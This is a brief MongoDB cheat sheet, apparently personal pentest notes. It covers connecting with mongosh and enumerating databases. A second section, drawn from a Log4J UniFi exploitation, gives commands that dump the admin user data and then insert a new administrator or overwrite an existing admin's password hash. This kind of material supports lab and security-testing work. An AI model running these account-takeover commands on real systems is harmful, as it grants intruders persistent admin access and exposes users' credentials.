# MongoDB

## Shell connection
```
curl -O https://downloads.mongodb.com/compass/mongosh-2.3.2-linux-x64.tgz
tar xvf mongosh-2.3.2-linux-x64.tgz
cd mongosh-2.3.2-linux-x64/bin
./mongosh mongodb://<IP>:<PORT>
```
Afterwards we can issue commands
```
# List databases
show dbs;

# Select database
use <db name>;

# List collections
show collections;

# show data in collection
db.<collection name>.find()
db.<collection name>.find().pretty()
```

## Another way
Below is example from Log4J unifi exploitation
```
# Dump user data
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"

# Add new user
mongo --port 27117 ace --eval 'db.admin.insert({ "email" : "null@localhost.local", "last_site_name" : "default", "name" : "unifi-admin", "x_shadow" : "<PASSWORD-HASH>" })'

# Update user
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"<PASSWORD-HASH>"}})'
```
